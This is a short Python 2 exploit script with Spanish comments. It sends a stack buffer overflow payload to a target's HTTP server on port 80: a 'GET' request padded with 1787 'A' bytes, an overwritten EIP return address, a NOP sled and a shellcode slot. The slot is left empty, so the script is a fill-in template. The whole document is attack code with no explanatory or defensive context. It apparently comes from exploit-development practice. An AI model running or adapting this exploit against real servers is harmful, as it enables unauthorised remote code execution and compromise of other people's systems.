import sys, socket
from pwn import *

inicio_buffer = "GET "
offset = 1787
# Direccion de Ejemplo EIP: 7784E871
EIP = "\x71\xE8\x84\x77"

shellcode =  b""

NOPs = "\x90" * 8
final_buffer = "HTTP/1.1\r\n\r\n"

payload = inicio_buffer + "\x41" * offset + EIP +  NOPs + shellcode +  final_buffer

def mostrar_uso():
    print "\n[i] Uso: python "+sys.argv[0]+" <IP>\n"
    sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        mostrar_uso()
    ip = sys.argv[1]
    puerto = 80
    progreso = log.progress("")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, puerto))
    progreso.status("Enviando Buffer Malicioso de "+str(len(payload))+" bytes")
    sock.send(payload)
    sock.recv(1024)
    
    
